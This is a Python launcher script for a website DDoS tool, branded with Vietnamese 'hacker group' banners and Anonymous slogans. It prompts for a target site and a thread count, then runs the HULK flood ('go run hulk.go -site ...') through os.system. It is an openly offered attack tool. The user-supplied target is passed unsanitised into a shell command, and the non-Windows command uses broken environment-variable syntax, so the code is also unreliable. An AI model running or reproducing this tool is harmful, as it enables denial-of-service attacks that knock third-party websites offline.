from colorama import Fore, Back, Style
#print(Fore.RED + 'some red text')
#print(Back.GREEN + 'and with a green background')
#print(Style.DIM + 'and in dim text')
#print(Style.RESET_ALL)
#print('back to normal now')
import os
import pyttsx3
import sys
import platform
def say_stuff(stuff_to_say):
    engine = pyttsx3.init()
    engine.say(str(stuff_to_say))
    engine.runAndWait()
print(Fore.GREEN + Back.BLACK)
if str(platform.system()) == 'Linux':
    os.system('figlet Hồ Xuân Bình - DDoS Attack')
else:
    os.system('pyfiglet Ho Xuan Binh - Go To VIET NAM')

print(Back.GREEN + Fore.GREEN +'[+] Anonymous DDoS tool by' + Fore.RED + 'Nhóm HACKER Đến Từ Việt Nam                              ') 
print(Back.GREEN + Fore.BLACK + '[+] Tool DDoS Wed V1                                             ')
print(Back.BLACK +Fore.GREEN + '[+] Tool DDoS Attack Chạy Bằng Kali - Python, Tool do Nhà Phát Triển Hồ Xuân Bình Sáng Lập                         ')
print(Fore.YELLOW + '[+] Chúng tôi vô danh, chúng tôi là một quân đoàn, chúng tôi không tha thứ, chúng tôi không quên                            ')
print(Fore.GREEN + '[+] Bắt đầu Công cụ AnonPAK DoS với 1024 Chủ đề cơ sở làm Thay đổi mặc định bên dưới khi Bắt buộc           ')
print(Fore.BLUE + 'Tác giả: ' + Fore.GREEN + 'Hồ Xuân Bình X Developer')
print(Fore.RED + 'Youtube: ' + Fore.GREEN + 'https://www.youtube.com/channel/UChcwlqpx3Cz1LAG1Rc2Hz6w')
print(Fore.YELLOW + 'Facebook: ' + Fore.GREEN + 'Lai Hồ Xuân Bình')
print('Your OS:'+ Fore.RED + str(platform.system())+Fore.GREEN)
try:
    threads = input('[+] NHẬP SỐ' + Fore.BLUE + ' THREADS ' + Fore.GREEN + 'FOR DDoS >>>')
    site = input(Fore.BLUE + '[+] Nhập trang web mà bạn muốn' + Fore.RED + ' DDoS ' + Fore.GREEN + '>>>')
    colab_status = input(Fore.YELLOW + 'Bạn có DDoS với Google Colab không [Y/N]')
    attack_severity = input('[+] Enter'+ Fore.RED +' 1'+Fore.GREEN+' Đối với một rất nhỏ'+Fore.RED+' Target'+Fore.GREEN+' Giống như một thiết bị and' + Fore.YELLOW + ' 2 ' + Fore.GREEN +' for a ' + Fore.YELLOW + 'Website '+ Fore.GREEN + ' >>>')
    if 'Y' == colab_status:
        print('OK, Bây giờ không sử dụng Text-to-Speech để làm cho cuộc tấn công của bạn trông như thế nào' + Fore.RED+ ' Cool' + Fore.GREEN)
    if 'y' == colab_status:
        print('OK, Bây giờ không sử dụng Text-to-Speech để làm cho cuộc tấn công của bạn trông như thế nào' + Fore.RED+ ' Cool' + Fore.GREEN)
    if 'n' == colab_status:
        if str(platform.system()) == 'Linux':
            print('[+] Khi bạn đang sử dụng Linux, Không, Chuyển văn bản thành giọng nói')
        else:
            say_stuff("Tấn công trang web mục tiêu của bạn {0} with {1} Threads".format(site, threads))
    if 'N' == colab_status:
        if str(platform.system()) == 'Linux':
            print('[+] As you are on Linux, No, Text-to-Speech')
        else:
            say_stuff("Tấn công trang web mục tiêu của bạn {0} with {1} Threads".format(site, threads))

    print('[+] Executing Command as Follows')
    print(Fore.GREEN +'Hồ Xuân Bình x Developer={0} go run hulk.go -site {1}'.format(threads,site))
    if 'Windows' in str(platform.system()):
        os.system('go run hulk.go -site {0}'.format(site))
    else:
        os.system('Hồ Xuân Bình x Developer={0} go run hulk.go -site {1}'.format(threads,site))
    print(Back.BLACK + Fore.GREEN)
    
except:
    print('[+] Quá trình thực thi bị dừng với mã lỗi 0, Cài đặt GoLang hoặc Internet của bạn không hoạt động bình thường')
    print('[+] Cài đặt phụ thuộc')
    os.system('python3 Install_Dependancies.py')
    os.system('python Install_Dependancies.py')
    os.system('py Install_Dependancies.py')

